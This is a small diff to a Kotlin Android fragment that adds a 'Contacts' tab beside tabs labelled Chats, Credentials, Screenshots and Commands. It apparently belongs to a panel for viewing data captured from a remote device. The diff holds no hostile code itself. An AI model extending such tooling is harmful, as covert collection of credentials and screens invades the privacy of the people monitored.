@@ -54,9 +54,10 @@ class DeviceDataFragment : Fragment() {
                 tab.text = when (position) {
                     0 -> "Notifications"
                     1 -> "Chats"
-                    2 -> "Credentials"
-                    3 -> "Screenshots"
-                    4 -> "Commands"
+                    2 -> "Contacts"
+                    3 -> "Credentials"
+                    4 -> "Screenshots"
+                    5 -> "Commands"
                     else -> ""
                 }
             }.attach()
